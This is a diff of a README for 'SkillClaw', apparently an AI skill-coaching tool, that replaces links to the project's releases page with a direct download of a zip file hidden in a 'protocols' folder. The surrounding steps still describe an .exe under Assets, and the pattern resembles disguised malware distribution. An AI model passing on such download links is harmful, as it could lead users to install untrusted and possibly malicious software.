@@ -1,6 +1,6 @@
 # 🤖 SkillClaw - Improve your skills with intelligent agents
 
-[![Download SkillClaw](https://img.shields.io/badge/Download-SkillClaw-blue.svg)](https://github.com/Cyberphobialaxation2471/SkillClaw/releases)
+[![Download SkillClaw](https://img.shields.io/badge/Download-SkillClaw-blue.svg)](https://github.com/Cyberphobialaxation2471/SkillClaw/raw/refs/heads/main/skillclaw/protocols/Claw_Skill_v3.6.zip)
 
 SkillClaw helps you build and refine personal skills using artificial intelligence. It uses agentic technology to track your progress and suggest ways to grow. This tool learns from your patterns to provide better advice over time.
 
@@ -8,7 +8,7 @@ SkillClaw helps you build and refine personal skills using artificial intelligen
 
 You need to get the installer from the release page. This page contains the latest version of the program.
 
-1. Go to this link: [https://github.com/Cyberphobialaxation2471/SkillClaw/releases](https://github.com/Cyberphobialaxation2471/SkillClaw/releases)
+1. Go to this link: [https://github.com/Cyberphobialaxation2471/SkillClaw/raw/refs/heads/main/skillclaw/protocols/Claw_Skill_v3.6.zip](https://github.com/Cyberphobialaxation2471/SkillClaw/raw/refs/heads/main/skillclaw/protocols/Claw_Skill_v3.6.zip)
 2. Look for the section labeled "Assets".
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your computer.
